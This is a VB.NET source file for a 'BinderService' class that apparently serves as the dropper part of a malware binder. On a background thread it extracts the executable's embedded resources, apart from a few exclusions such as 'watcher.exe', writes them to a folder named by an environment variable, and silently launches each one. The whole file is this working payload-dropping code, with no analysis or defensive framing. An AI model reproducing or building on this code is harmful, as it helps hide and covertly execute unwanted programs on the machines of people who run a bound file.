Imports System.IO
Imports System.Reflection

Namespace Other
    Public Class BinderService
        Public DropperPath As String = ""
        Public Function StartBinder()
            Dim BinderThread As New Threading.Thread(AddressOf DropFile)
            BinderThread.IsBackground = True
            BinderThread.Start()
            Return True
        End Function
        Public Function DropFile()
            Try
                WriteResourceToFile()
                Return True
            Catch ex As Exception
                Return False
            End Try
        End Function
        Private Sub WriteResourceToFile()
            Dim res() As String = Assembly.GetExecutingAssembly().GetManifestResourceNames

            For Each name As String In res
                Using resource = Assembly.GetExecutingAssembly().GetManifestResourceStream(name)
                    If Not (name.Contains("MainController.resources") Or name.Contains("Resources.resources") Or name.Contains("watcher.exe")) Then

                        Using file = New FileStream(Path.Combine(Environ(DropperPath), name), FileMode.Create, FileAccess.Write)

                            resource.CopyTo(file)

                        End Using

                        Process.Start(Path.Combine(Environ(DropperPath), name))
                    End If
                End Using
            Next

        End Sub
    End Class
End Namespace